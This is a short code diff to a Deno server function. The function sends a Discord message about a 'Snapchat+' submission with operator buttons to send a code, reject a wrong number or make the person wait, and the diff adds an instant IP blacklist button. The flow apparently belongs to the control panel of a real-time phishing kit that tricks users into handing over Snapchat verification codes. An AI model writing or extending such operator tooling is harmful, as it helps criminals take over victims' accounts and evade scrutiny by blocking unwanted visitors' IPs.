@@ -37,6 +37,7 @@ Deno.serve(async (req) => {
   const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
   const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
   const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
+  const blacklistUrl = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(finalIp)}`;
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
@@ -53,7 +54,7 @@ Deno.serve(async (req) => {
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "⚡ Actions",
-        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})`,
+        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
         inline: false
       },
     ],
